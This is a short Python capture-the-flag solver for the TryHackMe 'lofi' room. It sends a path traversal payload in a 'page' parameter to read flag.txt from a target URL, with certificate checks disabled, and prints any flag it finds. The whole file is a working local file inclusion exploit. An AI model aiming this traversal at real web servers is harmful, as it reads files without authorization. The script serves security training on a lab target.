# https://tryhackme.com/room/lofi

import sys
import requests
import re

def read_flag(url):

    path="?page=../../../../../../../../../../../../flag.txt"

    response = requests.get(url + path,verify=False)
    match = re.search(r"flag\{.*?\}", response.text)

    if match:
        print("Found:", match.group())
    else:
        print("flag not found.")

def main():

    if len(sys.argv) != 2:

        print("You must enter an input !!!")
        print("Example: %s http://10.10.10.10:8000/ "% sys.argv[0])
        sys.exit(-1)

    url = sys.argv[1]
    print("Program is runing....")
    read_flag(url)

if __name__ == "__main__":
    main()
